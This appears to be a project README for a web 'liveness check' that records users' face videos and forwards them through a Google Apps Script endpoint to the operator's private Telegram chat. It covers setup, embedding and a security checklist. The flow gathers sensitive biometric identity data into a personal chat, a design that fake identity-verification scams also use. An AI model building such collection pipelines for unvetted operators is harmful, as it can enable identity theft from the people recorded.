# Liveness Check — Vercel + Google Apps Script → Telegram

A single-page identity-verification flow (consent + on-device gesture detection
+ video capture). The verification UI is served from Vercel; the recorded
video is sent to a Google Apps Script Web App that forwards it to your
Telegram chat via Bot API.

## Architecture

```
Browser  ──(1)──▶  Apps Script Web App (/exec)
   │  (JSON body: { mime, ua, video: base64 })  │
   │                                             │ multipart sendVideo
   │                                             ▼
   │                                     Telegram Bot API
   │                                             │
   │                                             ▼
   │                                     Your private chat  📥
   ◀──(2)──  { ok: true, file: "..." }
```

Vercel just hosts the static page (`public/`). No serverless functions
involved — Vercel's 4.5 MB body cap doesn't apply because the upload skips
Vercel entirely.

## Why Apps Script (and base64)?

Apps Script Web Apps don't accept raw binary POST bodies and mishandle CORS
preflight. We work around both:

- Base64-encode the video on the client.
- POST as `Content-Type: text/plain` — a "simple" CORS request that browsers
  send without an OPTIONS round-trip.

Trade-off: base64 inflates the payload by ~33%, so we cap recording at 25 MB
of raw video (≈33 MB on the wire).

## Setup

### 1. Create a Telegram bot

1. Telegram → message `@BotFather` → `/newbot` → follow the prompts.
2. Copy the bot token (e.g. `123456789:AAH...`).
3. Search your bot's username and press **Start** so it can DM you.
4. Get your numeric chat id: message `@userinfobot`, copy the `Id` it replies
   with. (For a private channel: forward a message from the channel to
   `@RawDataBot` and look for `forward_from_chat.id`.)

### 2. Deploy the Apps Script Web App

See [`gas/README.md`](gas/README.md) for the step-by-step. In short:

1. https://script.google.com → **New project** → paste the contents of
   [`gas/Code.gs`](gas/Code.gs).
2. **Project Settings** (gear icon) → **Script Properties**, add:

   | Property | Value |
   |---|---|
   | `TELEGRAM_BOT_TOKEN` | the token from BotFather |
   | `TELEGRAM_CHAT_ID` | your numeric chat id |

3. **Deploy** → **New deployment** → type **Web app** → Execute as **Me**,
   access **Anyone** → **Deploy**.
4. Copy the **Web app URL** (ends in `/exec`).

### 3. Tell the page where the script lives

In `public/index.html`, replace the meta tag's `content` with the URL:

```html
<meta name="liveness-api" content="https://script.google.com/macros/s/.../exec" />
```

### 4. Push to Vercel

```sh
git add public/index.html && git commit -m "wire up apps script url" && git push
```

Vercel redeploys automatically.

## Using it from your existing site

```html
<iframe
  src="https://<your-project>.vercel.app/?embed=1"
  allow="camera"
  width="100%" height="600"
  style="border:0"
></iframe>

<script>
  const iframe = document.querySelector('iframe');
  window.addEventListener('message', (e) => {
    if (e.source !== iframe.contentWindow) return;
    if (e.origin !== 'https://<your-project>.vercel.app') return;
    const msg = e.data;
    if (msg?.source !== 'liveness-check') return;

    if (msg.type === 'success') {
      // msg.file → filename forwarded to Telegram
      console.log('verified', msg);
    }
    if (msg.type === 'resize') iframe.style.height = (msg.height + 4) + 'px';
  });
</script>
```

Full message protocol is in [`public/host.html`](public/host.html).

## Local development

```sh
npm install
npm run dev                      # http://localhost:3000
```

There's no Apps Script emulator. Test by deploying the script and pointing
the meta tag at the real `/exec` URL.

## Limits & trade-offs

| | |
|---|---|
| **Capture quality** | 1280×720 @ 4 Mbps. Full resolution and bitrate. |
| **Max recording duration** | 45 s. At 4 Mbps that's ~22.5 MB raw, ~30 MB after base64. |
| **Max upload size** | 25 MB raw video (client-side check). |
| **Apps Script POST body** | ~50 MB (undocumented but well-tested). |
| **Daily URL fetch quota** | 20,000 / day on free Google accounts. |
| **Failover** | If Telegram rejects `sendVideo`, the script retries with `sendDocument` so the bytes still arrive. |
| **No retention** | Bytes pass through Apps Script and are not stored. Telegram is the only persistent copy. |

## Security checklist before production

| | |
|---|---|
| **HTTPS** | ✅ automatic on Vercel and Apps Script. Required by `getUserMedia`. |
| **Origin check in parent** | Verify `event.origin` against the iframe URL before trusting `success` messages. |
| **Tighten `postToParent` target** | In [`public/app.js`](public/app.js), replace `'*'` with your parent site's origin. |
| **Bot token secrecy** | Stored as Script Property — never appears in client code or version control. |
| **Authorize requests** | Apps Script Web Apps deployed with access **Anyone** accept any POST. Add a shared secret or signed token check inside `doPost` if the page is public. |

## File map

| | |
|---|---|
| `public/index.html` | The verification UI (Arabic, RTL). Holds the `<meta name="liveness-api">` script URL. |
| `public/app.js` | Gesture detection (MediaPipe) + capture (MediaRecorder) + base64 upload via XHR. Embed mode auto-detected. |
| `public/styles.css` | Dark theme. |
| `public/host.html` | Demo of how a parent page embeds the iframe and listens for messages. |
| `gas/Code.gs` | Apps Script web app — receives the video and forwards it to Telegram. |
| `gas/README.md` | Apps Script-specific deployment notes. |
| `vercel.json` | `Permissions-Policy: camera=(self)`, clean URLs. |
